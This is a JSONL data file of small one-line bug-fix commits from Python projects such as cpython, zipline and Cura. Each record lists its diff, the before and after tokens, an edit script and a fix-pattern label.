{"project": "cpython", "commit_sha": "4563e81e7810df79f6fc406496e39ac0ac6ff06d", "parent_sha": "ce64082ae02971799e2095385c58015415440d24", "file_path": "Tools/idle/AutoIndent.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -495,7 +495,7 @@ def classifyws(s, tabwidth):\n             effective = effective + 1\n         elif ch == '\\t':\n             raw = raw + 1\n-            effective = (effective / tabwidth + 1) * tabwidth\n+            effective = (int(effective / tabwidth) + 1) * tabwidth\n         else:\n             break\n     return raw, effective\n", "before": "effective = ( effective / tabwidth + 1 ) * tabwidth", "after": "effective = ( int ( effective / tabwidth ) + 1 ) * tabwidth", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 26, 3, 50], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"binary_operator\", 3, 26, 3, 46], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "cpython", "commit_sha": "6f1f9449c210805077b954f11a950310b34c73a5", "parent_sha": "4563e81e7810df79f6fc406496e39ac0ac6ff06d", "file_path": "Lib/idlelib/AutoIndent.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -462,7 +462,7 @@ def classifyws(s, tabwidth):\n             effective = effective + 1\n         elif ch == '\\t':\n             raw = raw + 1\n-            effective = (effective / tabwidth + 1) * tabwidth\n+            effective = (int(effective / tabwidth) + 1) * tabwidth\n         else:\n             break\n     return raw, effective\n", "before": "effective = ( effective / tabwidth + 1 ) * tabwidth", "after": "effective = ( int ( effective / tabwidth ) + 1 ) * tabwidth", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 26, 3, 50], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"binary_operator\", 3, 26, 3, 46], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "coursebuilder-core", "commit_sha": "968a164260cc14708d7d7c7651db47e50f91f0a3", "parent_sha": "60a2df2915e4799bd979ad115e51c47f7aa3540e", "file_path": "coursebuilder/controllers/utils.py", "project_url": "https://github.com/imisi-akande/coursebuilder-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -415,7 +415,7 @@ class XsrfTokenManager(object):\n         # Round time to seconds.\n         issued_on = long(issued_on)\n \n-        digester = hmac.new(XSRF_SECRET.value)\n+        digester = hmac.new(str(XSRF_SECRET.value))\n         digester.update(str(user_id))\n         digester.update(cls.DELIMITER_PRIVATE)\n         digester.update(str(action_id))\n", "before": "digester = hmac . new ( XSRF_SECRET . value )", "after": "digester = hmac . new ( str ( XSRF_SECRET . value ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 47], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 28, 3, 47], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 28, 3, 47], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 28, 3, 47], 1]]"}
{"project": "periphondemand", "commit_sha": "d560fe938e8b2c0c6185a6a76b691e1e7cbee086", "parent_sha": "4ce0a6d3eddccc24c38084c4aaf100d17fefd10e", "file_path": "src/bin/toolchain/synthesis.py", "project_url": "https://github.com/xcthulhu/periphondemand", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -113,7 +113,7 @@ class Synthesis(WrapperXml):\n         sys.path.append(settings.path+TOOLCHAINPATH+\\\n                     SYNTHESISPATH+\"/\"+self.getName())\n         filename = plugin.generateTCL(self)\n-        self.setTCLScriptName(filename)\n+        self.setTCLScriptName(str(filename))\n         return None\n \n     def setTCLScriptName(self,filename):\n", "before": "self . setTCLScriptName ( filename )", "after": "self . setTCLScriptName ( str ( filename ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 40], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 30, 3, 40], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 30, 3, 40], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 30, 3, 40], 1]]"}
{"project": "pypugjs", "commit_sha": "43bab7163f4debf4698383c69b37e16a7d8b06f4", "parent_sha": "77b1c2295986cde1c5ed1db7e7af5538e7f7180f", "file_path": "pyjade/convert.py", "project_url": "https://github.com/akubera/pypugjs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def convert_file():\n         if len(args) >= 1:\r\n             template = codecs.open(args[0], 'r', encoding='utf-8').read()\r\n         else:\r\n-            template = sys.stdin.read()\r\n+            template = codecs.getreader('utf-8')(sys.stdin).read()\r\n         output = process(template, compiler=available_compilers[compiler],\r\n                          staticAttrs=True, extension=extension)\r\n         if file_output:\r\n", "before": "template = sys . stdin . read ( )", "after": "template = codecs . getreader ( 'utf-8' ) ( sys . stdin ) . read ( )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"attribute\", 3, 24, 3, 38], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"attribute\", 3, 24, 3, 33], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:codecs\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:getreader\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N4\", [\"):)\", \"T\"], 2]]"}
{"project": "mpReview", "commit_sha": "e5646da9b2a39181c6f7a05d30ac79e73ea818aa", "parent_sha": "321a5cdcd2af2c32683d686b3a95c46b01534b73", "file_path": "PCampReview.py", "project_url": "https://github.com/SlicerProstate/mpReview", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -837,7 +837,7 @@ class PCampReviewWidget:\n           latestSegmentations[structureName] = segmentation\n         else:\n           storedSegmentation = latestSegmentations[structureName]\n-          storedTimeStamp = storedSegmentation[storedSegmentation.rfind(\"-\")+1:-5]\n+          storedTimeStamp = int(storedSegmentation[storedSegmentation.rfind(\"-\")+1:-5])\n           if timeStamp > storedTimeStamp:\n             latestSegmentations[structureName] = segmentation\n \n", "before": "storedTimeStamp = storedSegmentation [ storedSegmentation . rfind ( \"-\" ) + 1 : - 5 ]", "after": "storedTimeStamp = int ( storedSegmentation [ storedSegmentation . rfind ( \"-\" ) + 1 : - 5 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 11, 3, 83], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 29, 3, 83], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pony", "commit_sha": "b6f47508660b03e31ee544e4ad26959c08b8b10c", "parent_sha": "0658284ec32dea6f35f32b31c0a9b92e1a53bb8d", "file_path": "pony/orm/serialization.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ def to_dict(objects):\n     bag = Bag(database)\n     bag.put(first_object)\n     bag.put(objects)\n-    return bag.to_dict()\n+    return dict(bag.to_dict())\n \n def to_json(objects):\n     return json.dumps(to_dict(objects), default=json_converter, indent=2, sort_keys=True)\n", "before": "return bag . to_dict ( )", "after": "return dict ( bag . to_dict ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 25], [\"identifier:dict\", \"T\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 25], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 25], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "genologics", "commit_sha": "95abef0b71b805f2c7cf748901561a6d1c909f81", "parent_sha": "18f2c5ba63e3c38499832e35a4afbf108a5fc37b", "file_path": "genologics/entities.py", "project_url": "https://github.com/BigelowLab/genologics", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -285,7 +285,7 @@ class UdfDictionary(object):\n                                           type=type,\n                                           name=key)\n             if not isinstance(value, unicode):\n-                value = unicode(value, 'UTF-8')\n+                value = unicode(str(value), 'UTF-8')\n             elem.text = value\n \n     def __delitem__(self, key):\n", "before": "value = unicode ( value , 'UTF-8' )", "after": "value = unicode ( str ( value ) , 'UTF-8' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 48], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:value\", 3, 33, 3, 38], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "django-denorm", "commit_sha": "577f1db7fad018f318ce0976455ea964c2e1afba", "parent_sha": "6946b407d67eec3e12e21e8cc0a85327aca1b52a", "file_path": "denorm/helpers.py", "project_url": "https://github.com/Edrolo/django-denorm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def find_m2ms(from_model, to_model, m2m_name=None):\n     # get all ManyToManyFields\n-    m2ms = from_model._meta.many_to_many + from_model._meta.virtual_fields\n+    m2ms = list(from_model._meta.many_to_many) + from_model._meta.virtual_fields\n \n     # filter out all M2Ms not pointing to 'to_model'\n     m2ms = [x for x in m2ms if hasattr(x, 'rel') and repr(x.rel.to).lower() == repr(to_model).lower()]\n", "before": "m2ms = from_model . _meta . many_to_many + from_model . _meta . virtual_fields", "after": "m2ms = list ( from_model . _meta . many_to_many ) + from_model . _meta . virtual_fields", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 1, 12, 1, 75], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 1, 12, 1, 41], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "zipline", "commit_sha": "1054134bd9e8796861500e4d714980b0e2cf28bf", "parent_sha": "83b0e51b59ee53650ada9751f3b7dca12d7aec63", "file_path": "zipline/finance/performance/period.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -351,7 +351,7 @@ class PerformancePeriod(object):\n \n     def calculate_positions_value(self):\n         if len(self.position_values) == 0:\n-            return 0\n+            return np.float64(0)\n \n         return sum(self.position_values)\n \n", "before": "return 0", "after": "return np . float64 ( 0 )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 21], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:np\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:float64\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"integer:0\", 3, 20, 3, 21], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "zipline", "commit_sha": "ded6f8543fa7af7eeab4b1941b95e2f3ef99c26c", "parent_sha": "3af8b6d6c89e0610576c28fa6b66e1f99fae5445", "file_path": "zipline/assets/assets.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -314,7 +314,7 @@ class AssetFinder(object):\n         symbol = symbol.upper()\n-        ad_value = normalize_date(as_of_date).value\n+        ad_value = pd.Timestamp(normalize_date(as_of_date)).value\n \n         if fuzzy is None:\n             try:\n", "before": "ad_value = normalize_date ( as_of_date ) . value", "after": "ad_value = pd . Timestamp ( normalize_date ( as_of_date ) ) . value", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 1, 20, 1, 46], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 1, 20, 1, 46], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"identifier:pd\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:Timestamp\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"call\", 1, 20, 1, 46], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "gdata-python-client", "commit_sha": "55d2975c59e2ebecdfe30a1a5837989184a16de8", "parent_sha": "3161815873d169aabc509b14c71761eb729e6add", "file_path": "src/atom/http.py", "project_url": "https://github.com/ratio/gdata-python-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class HttpClient(atom.http_interface.GenericHttpClient):\n     # calculate it based on the data object.\n     if data and 'Content-Length' not in all_headers:\n       if isinstance(data, types.StringTypes):\n-        all_headers['Content-Length'] = len(data)\n+        all_headers['Content-Length'] = str(len(data))\n       else:\n         raise atom.http_interface.ContentLengthRequired('Unable to calculate '\n             'the length of the data parameter. Specify a value for '\n", "before": "all_headers [ 'Content-Length' ] = len ( data )", "after": "all_headers [ 'Content-Length' ] = str ( len ( data ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 41, 3, 50], [\"identifier:str\", \"T\"], 0], [\"Insert\", [\"call\", 3, 41, 3, 50], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 41, 3, 50], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "modmail", "commit_sha": "b7909f2dbcfccbb22b35fb89ac3c91bdc3188852", "parent_sha": "55efe085c108e975b173477c0b2b7e19fd650d59", "file_path": "bot.py", "project_url": "https://github.com/armani12/modmail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ class Modmail(commands.Bot):\n     @commands.command(name='close')\n     @commands.has_permissions(manage_guild=True)\n     async def _close(self, ctx):\n-        if 'User ID:' not in ctx.channel.topic:\n+        if 'User ID:' not in str(ctx.channel.topic):\n             return await ctx.send('This is not a modmail thread.')\n         user_id = int(ctx.channel.topic.split(': ')[1])\n         user = self.get_user(user_id)\n", "before": "if 'User ID:' not in ctx . channel . topic : return await ctx . send ( 'This is not a modmail thread.' )", "after": "if 'User ID:' not in str ( ctx . channel . topic ) : return await ctx . send ( 'This is not a modmail thread.' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 47], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 30, 3, 47], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "43dbc48955f2604d08b5b772c22af3da672a9508", "parent_sha": "2f20c21d32d42507a8cf060484cd2318a106988b", "file_path": "lib/python/Components/ParentalControl.py", "project_url": "https://github.com/sotocirus/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ class ParentalControl:\n \t\telse:\n \t\t\tself.checkPinInterval = True\n \t\t\tiMinutes = float(self.storeServicePin)\n-\t\t\tiSeconds = iMinutes*60\n+\t\t\tiSeconds = int(iMinutes*60)\n \t\t\tself.pinIntervalSeconds = iSeconds\n \t\n \t\tself.configInitialized = True\n", "before": "iSeconds = iMinutes * 60", "after": "iSeconds = int ( iMinutes * 60 )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 4, 3, 26], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"binary_operator\", 3, 15, 3, 26], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "populo", "commit_sha": "dae5cdfceb13812d761aa19b63c82cea55049ebe", "parent_sha": "9edda95096c775cdfe18bc6b3d376ea015d2a48a", "file_path": "common/test/acceptance/pages/lms/instructor_dashboard.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -400,7 +400,7 @@ class CohortManagementSection(PageObject):\n         if wait_for_messages:\n             EmptyPromise(\n-                lambda: self.q(css=self._bounded_selector(title_css)).results != 0,\n+                lambda: len(self.q(css=self._bounded_selector(title_css)).results) != 0,\n                 \"Waiting for messages to appear\"\n             ).fulfill()\n         message_title = self.q(css=self._bounded_selector(title_css))\n", "before": "EmptyPromise ( lambda : self . q ( css = self . _bounded_selector ( title_css ) ) . results != 0 , \"Waiting for messages to appear\" ) . fulfill ( )", "after": "EmptyPromise ( lambda : len ( self . q ( css = self . _bounded_selector ( title_css ) ) . results ) != 0 , \"Waiting for messages to appear\" ) . fulfill ( )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"comparison_operator\", 2, 25, 2, 83], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 2, 25, 2, 78], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "horizon", "commit_sha": "7179ee286a924765260dd03229a24ccc476dcfda", "parent_sha": "ef1d49e086b8f69c07437642ebfefbe9e701321d", "file_path": "openstack_dashboard/dashboards/project/volumes/volumes/forms.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ def availability_zones(request):\n                                          'zones.'))\n     if not zone_list:\n         zone_list.insert(0, (\"\", _(\"No availability zones found\")))\n-    elif len(zone_list) > 0:\n+    elif len(zone_list) > 1:\n         zone_list.insert(0, (\"\", _(\"Any Availability Zone\")))\n \n     return zone_list\n", "before": "if not zone_list : zone_list . insert ( 0 , ( \"\" , _ ( \"No availability zones found\" ) ) ) elif len ( zone_list ) > 0 : zone_list . insert ( 0 , ( \"\" , _ ( \"Any Availability Zone\" ) ) )", "after": "if not zone_list : zone_list . insert ( 0 , ( \"\" , _ ( \"No availability zones found\" ) ) ) elif len ( zone_list ) > 1 : zone_list . insert ( 0 , ( \"\" , _ ( \"Any Availability Zone\" ) ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 27, 3, 28], \"1\"]]"}
{"project": "dedupe", "commit_sha": "0a2a77b85c972e64682817157a5b02e1f54d7292", "parent_sha": "f8270c157a494801cdb993bf965dfa1525b3f33b", "file_path": "dedupe/api.py", "project_url": "https://github.com/c-rap/dedupe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -334,7 +334,7 @@ class RecordLinkMatching(Matching) :\n         self._cluster = clustering.greedyMatching\n         self._linkage_type = \"RecordLink\"\n \n-    def match(self, data_1, data_2, threshold = 1.5) : # pragma : no cover\n+    def match(self, data_1, data_2, threshold = 0.5) : # pragma : no cover\n", "before": "def match ( self , data_1 , data_2 , threshold = 1.5 ) : ", "after": "def match ( self , data_1 , data_2 , threshold = 0.5 ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1.5\", 3, 49, 3, 52], \"0.5\"]]"}
{"project": "VGMdb-BeetsPlug", "commit_sha": "828f2761b55d631a0a760a36f826e7796cedc509", "parent_sha": "b6c0e168cf5a07e5b8376510cd46d741525ec5c6", "file_path": "vgmdb.py", "project_url": "https://github.com/elarkham/VGMdb-BeetsPlug", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class VGMdbPlugin(BeetsPlugin):\n     def __init__(self):\n         super(VGMdbPlugin, self).__init__()\n         self.config.add({\n-            'source_weight': 1.0,\n+            'source_weight': 0.0,\n             'lang-priority': 'en, ja-latn'\n         })\n         log.debug('Querying VGMdb')\n", "before": "self . config . add ( { 'source_weight' : 1.0 , 'lang-priority' : 'en, ja-latn' } )", "after": "self . config . add ( { 'source_weight' : 0.0 , 'lang-priority' : 'en, ja-latn' } )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1.0\", 3, 30, 3, 33], \"0.0\"]]"}
{"project": "nova", "commit_sha": "a7af3258f8d8f4eb4664a126e08b94c85b648e09", "parent_sha": "81184dc1c56f2cd69b957b8e718165e2f133aef1", "file_path": "nova/tests/unit/test_signature_utils.py", "project_url": "https://github.com/minditech/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class FakeCryptoCertificate(object):\n                  not_valid_before=(timeutils.utcnow() -\n                                    datetime.timedelta(hours=1)),\n                  not_valid_after=(timeutils.utcnow() +\n-                                  datetime.timedelta(hours=1))):\n+                                  datetime.timedelta(hours=2))):\n         self.pub_key = pub_key\n         self.cert_not_valid_before = not_valid_before\n         self.cert_not_valid_after = not_valid_after\n", "before": "not_valid_after = ( timeutils . utcnow ( ) + datetime . timedelta ( hours = 1 ) ) ) : self . pub_key = pub_key", "after": "not_valid_after = ( timeutils . utcnow ( ) + datetime . timedelta ( hours = 2 ) ) ) : self . pub_key = pub_key", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 60, 3, 61], \"2\"]]"}
{"project": "charm-neutron-openvswitch", "commit_sha": "4a1e65a8ba9b44fecd86b9bf88f7b22ff0848289", "parent_sha": "e3712301afcc6291df772a31375c841c59ee5083", "file_path": "tests/basic_deployment.py", "project_url": "https://github.com/CanonicalBootStack/charm-neutron-openvswitch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ class NeutronOVSBasicDeployment(OpenStackAmuletDeployment):\n         self.d.configure('neutron-openvswitch', {'use-syslog': 'True'})\n         if not u.service_restarted(self.compute_sentry,\n                                    'neutron-openvswitch-agent', conf,\n-                                   pgrep_full=True, sleep_time=20):\n+                                   pgrep_full=True, sleep_time=60):\n             self.d.configure('neutron-openvswitch', {'use-syslog': 'False'})\n             msg = ('service neutron-openvswitch-agent did not restart after '\n                    'config change')\n", "before": "if not u . service_restarted ( self . compute_sentry , 'neutron-openvswitch-agent' , conf , pgrep_full = True , sleep_time = 20 ) : self . d . configure ( 'neutron-openvswitch' , { 'use-syslog' : 'False' } ) msg = ( 'service neutron-openvswitch-agent did not restart after ' 'config change' )", "after": "if not u . service_restarted ( self . compute_sentry , 'neutron-openvswitch-agent' , conf , pgrep_full = True , sleep_time = 60 ) : self . d . configure ( 'neutron-openvswitch' , { 'use-syslog' : 'False' } ) msg = ( 'service neutron-openvswitch-agent did not restart after ' 'config change' )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:20\", 3, 64, 3, 66], \"60\"]]"}
{"project": "django-shop", "commit_sha": "550b623c60f57e46c4a813c3d4fdffd1891f6823", "parent_sha": "d77d8934e0fe24fa87d79595963c7e30866cc7ab", "file_path": "shop/util/fields.py", "project_url": "https://github.com/haricot/django-shop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class CurrencyField(DecimalField):\n     def __init__(self, **kwargs):\n         defaults = {\n             'max_digits': 30,\n-            'decimal_places': 2,\n+            'decimal_places': 3,  # intentionally 3 to avoid rounding errors when adding tax\n             'default': Decimal('0.0')\n         }\n         defaults.update(kwargs)\n", "before": "defaults = { 'max_digits' : 30 , 'decimal_places' : 2 , 'default' : Decimal ( '0.0' ) }", "after": "defaults = { 'max_digits' : 30 , 'decimal_places' : 3 , 'default' : Decimal ( '0.0' ) }", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 31, 3, 32], \"3\"]]"}
{"project": "snabb-api-backend", "commit_sha": "5214c5bdd22370aabb41e16c72607f407fa3f708", "parent_sha": "8bf0a31b29c496d4c574a4ebd77187935bb1428c", "file_path": "snabb/deliveries/views.py", "project_url": "https://github.com/SnabbHQ/snabb-api-backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class DeliveryViewSet(viewsets.ModelViewSet):\n         try:\n             delivery = Delivery.objects.get(\n                 delivery_quote=received['quote_id'])\n-            response = get_response(400605)\n+            response = get_response(400607)\n             return Response(\n                 data=response['data'], status=response['status'])\n         except Delivery.DoesNotExist:\n", "before": "response = get_response ( 400605 )", "after": "response = get_response ( 400607 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:400605\", 3, 37, 3, 43], \"400607\"]]"}
{"project": "Cura", "commit_sha": "ccae79c378643b02d3e4f9e9dfa2222ea33a7f01", "parent_sha": "0c1b4934bf0387f2beff87b375b1c272b541d6ae", "file_path": "cura/PrintInformation.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ class PrintInformation(QObject):\n \n             # Material amount is sent as an amount of mm^3, so calculate length from that\n             r = self._current_settings.getSettingValueByKey(\"material_diameter\") / 2\n-            self._material_amount = round((amount / (math.pi * r ** 2)) / 1000, 1)\n+            self._material_amount = round((amount / (math.pi * r ** 2)) / 1000, 2)\n             self.materialAmountChanged.emit()\n \n             if not self._enabled:\n", "before": "self . _material_amount = round ( ( amount / ( math . pi * r ** 2 ) ) / 1000 , 1 )", "after": "self . _material_amount = round ( ( amount / ( math . pi * r ** 2 ) ) / 1000 , 2 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 81, 3, 82], \"2\"]]"}
{"project": "Cura", "commit_sha": "7cc62db81dea84e367586a925d5cff10937df2b8", "parent_sha": "e9380ba83d0a3b7c45b659547149914aff784cc8", "file_path": "plugins/XRayView/__init__.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ def getMetaData():\n             \"author\": \"Ultimaker\",\n             \"version\": \"1.0\",\n             \"description\": catalog.i18nc(\"@info:whatsthis\", \"Provides the X-Ray view.\"),\n-            \"api\": 2\n+            \"api\": 3\n         },\n         \"view\": {\n             \"name\": catalog.i18nc(\"@item:inlistbox\", \"X-Ray\"),\n", "before": "\"api\" : 2 } ,", "after": "\"api\" : 3 } ,", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 20, 3, 21], \"3\"]]"}
